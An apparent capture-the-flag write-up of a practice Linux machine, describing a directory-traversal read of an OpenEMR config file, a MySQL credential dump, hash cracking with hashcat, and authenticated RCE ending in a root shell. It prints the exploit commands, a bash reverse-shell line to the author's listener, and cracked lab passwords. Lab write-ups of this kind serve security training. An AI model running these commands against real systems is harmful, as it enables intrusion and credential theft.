## Introduction

On this intermediate-level PG practice Linux machine, I discovered two web application endpointsâ€”one vulnerable to **Directory Traversal** and the other requiring authentication for **Remote Code Execution**. Using the traversal vulnerability, I included the configuration file containing **MySQL credentials**, logged in to retrieve the **admin password hash**, and cracked it. With valid credentials, I triggered the **authenticated RCE** to gain a **low-privileged shell**. The reused admin password also granted **`sudo` access**, leading to a **root shell**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

    ```bash
    sudo nxc smb $IP -u '' -p '' --shares
    ```

Getting the files

![image.png](image%204.png)

I didnâ€™t find anything useful inside `pdf` files, just the GitHub page of software developer.

### Port 3306

Version - MariaDB 5.5.5-10.1.48

## Web

### Port 80

Version - Apache httpd 2.4.29 ((Ubuntu))

Add the domain to `/etc/hosts`file:

![image.png](image%205.png)

**Gobutser Scan**

```bash
 gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/commo
```

![image.png](image%206.png)

Navigating to `filemanager` I find:

![image.png](image%207.png)

I found the following [exploit](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/49359&ved=2ahUKEwj_r-iX9uyNAxWR8bsIHVMsK64QFnoECAkQAQ&usg=AOvVaw16GcPpBv3bvpqkeil5aFZ1) for it. 

Running the exploit I can see the `/etc/passwd` file:

```bash
python3 49359.py http://$IP PHPSESSID=jlhfvj1ridg34u1e0v04biljc6 /etc/passwd
```

![image.png](image%208.png)

We donâ€™t have `SSH` to read user `white` private key, for now I will remember this and proceed with enumeration.

I also tried uploading php files for some possibility to execute them on the server, but I see that we can only upload these extensions:

![image.png](image%209.png)

**Vhost Fuzzing**

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://apex.offsec/ -H 'Host: FUZZ.apex.offsec' -fs 28957
```

## Exploitation

Checking the website I found `openemr` directory in  `scheduler` part:

![image.png](image%2011.png)

I found the following [exploit](https://www.exploit-db.com/exploits/49784) regarding the application.

Running gobuster I found several subdirectories and endpoints for `openemr` and under `admin.php` found its verison `5.0.1`.

![image.png](image%2012.png)

 This [exploit](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/49486&ved=2ahUKEwjHo5P04uyNAxWc6wIHHeW9CeIQFnoECB4QAQ&usg=AOvVaw0kFjFmvVjYDsVigxpdDcaK) is compatible with that version.

![image.png](image%2013.png)

But this exploit is Authenticated so we should know the `username` and `password` of `admin` user.

I navigated to `/sql` directory and find there `sql` files but I couldnâ€™t find current password for login panel.

In defaults I found default admin and its password which is `pass`.

![image.png](image%2014.png)

Actually checking endpoints I see that it is the same as in github repo, I am gonna try to find something useful there to not to waste time and then look up that location in our current app.

As we have local file read and authenticated RCE we most probably should read local file where credentials are stored.

I tried reading `sqlconf.php` file but it didnâ€™t work for some reason:

```bash
python3 49359.py http://$IP PHPSESSID=jlhfvj1ridg34u1e0v04biljc6 /var/www/openemr/sites/default/sqlconf.php
```

When accessing Responsive File Manager I see that `passwd` that I included is added to file list:

![image.png](image%2015.png)

Letâ€™s repeat including `sqlconf.php` with a newer `PHPSESSID` cookie value. This didnâ€™t work and I think it tried to paste `.php` file to the root, where the file with `.php` extension is not allowed. I am gonna change the the directory where the code pastes the file to `Documents` directory as it contains `.pdf` files high chance there is no restriction for that directory and it is also a share that we found before.

![image.png](image%2016.png)

```bash
python3 49359.py http://$IP PHPSESSID=686s7ljk22dgps65g0k0q9ge15 /var/www/openemr/sites/default/sqlconf.php
```

It shows there files but I donâ€™t see the third one:

![image.png](image%2017.png)

I checked the share too  and found it there. Maybe application tries to execute it thatâ€™s why it cannot be displayed on the web.

![image.png](image%2018.png)

Reading the file I can see MySQL credentials now:

![image.png](image%2019.png)

```bash
mysql -u openemr --ssl=0 -p -h $IP
```

![image.png](image%2020.png)

```bash
show databases;
use openemr;
show tables;
show columns from users;
select username, password from users;
show columns from users_secure;
select username, password from users_secure;
```

![image.png](image%2021.png)

 We can idenfitfy hash type using [hash type identifier](https://hashes.com/en/tools/hash_identifier)

![image.png](image%2022.png)

```bash
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%2023.png)

Now as we have credentials for admin, we can use openemr exploit to get RCE.

```bash
ruby 49486.rb auto --root-url http://192.168.122.145/openemr --user admin --password thedoctor --lhost 192.168.45.163 --lport 80
```

![image.png](image%2024.png)

It looks good, but I donâ€™t receive a shell, I am gonna access the provided URL.

![image.png](image%2025.png)

It says not found.

![image.png](image%2026.png)

![image.png](image%2027.png)

I am gonna try `5.0.1.3` too.

```bash
searchsploit -m 45161
```

```bash
python 45161.py http://192.168.122.145/openemr -u admin -p thedoctor -c id
```

It seems it worked, but output is now shown in the terminal.

![image.png](image%2028.png)

I am gonna try to run reverse shell.

```bash
python 45161.py http://192.168.122.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.163/80 0>&1'
```

![image.png](image%2029.png)

![image.png](image%2030.png)

Now we have a shell.

## Privilege Escalation

I am gonna check passwords we have obtained so far to get a root shell. I canâ€™t do that from this terminal, letâ€™s make it interactive using python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png](image%2031.png)

Now we are root.

## Credentials

```bash
openemr : C78maEQUIEuQ #MySQL
admin : thedoctor #openemr login
```

## Mitigation

- Sanitize all user input to prevent **directory traversal** vulnerabilities.
- Store sensitive credentials securely using environment variables or secrets management tools.
- Never reuse credentials across different services or privilege levels.
- Regularly update and patch web applications to fix known RCE bugs.
